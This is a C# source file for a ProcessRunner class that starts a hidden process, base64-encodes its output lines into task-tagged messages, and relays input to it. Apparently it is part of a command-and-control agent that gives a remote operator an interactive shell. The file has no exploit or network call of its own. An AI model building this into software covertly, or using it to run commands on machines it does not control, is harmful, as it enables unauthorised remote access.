using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent
{
    public class ProcessRunner
    {
        private Process process;
        private string task_id;
        private IMessageManager messageManager;
        public ProcessRunner(string command, string task_id, IMessageManager messageManager) {
            this.messageManager = messageManager;
            this.task_id = task_id;
            process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = command,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Arguments = ""
                }
            };
        }
        public void Start()
        {
            this.process.ErrorDataReceived += (sender, errorLine) => {
                if (errorLine.Data is not null)
                    messageManager.AddResponse(new InteractMessage()
                    {
                        data = Misc.Base64Encode(errorLine.Data + Environment.NewLine),
                        task_id = task_id,
                        message_type = InteractiveMessageType.Output
                    });
            };
            this.process.OutputDataReceived += (sender, outputLine) => { 
                if (outputLine.Data is not null)
                    messageManager.AddResponse(new InteractMessage()
                    {
                        data = Misc.Base64Encode(outputLine.Data + Environment.NewLine),
                        task_id = task_id,
                        message_type = InteractiveMessageType.Output
                    });
            };
            this.process.Exited += Process_Exited;
            this.process.Start();
            this.process.BeginErrorReadLine();
            this.process.BeginOutputReadLine();

            //this.process.WaitForExit();
        }

        public void Stop()
        {
            if (!this.process.HasExited)
            {
                this.process.Kill(true);
                this.process.Dispose();
            }
        }

        private void Process_Exited(object? sender, EventArgs e)
        {
            this.messageManager.AddResponse(new TaskResponse()
            {
                user_output = Environment.NewLine + "Process Finished.",
                task_id = this.task_id,
                completed = true,
                status = this.process.ExitCode == 0 ? "success" : "error"
            });
        }

        public void Write(byte[] input)
        {
            process.StandardInput.Write(input);
        }
        public void Write(string input)
        {
            process.StandardInput.WriteLine(input);
        }
        public void Write(byte input)
        {
            process.StandardInput.Write(input);
        }

    }
}
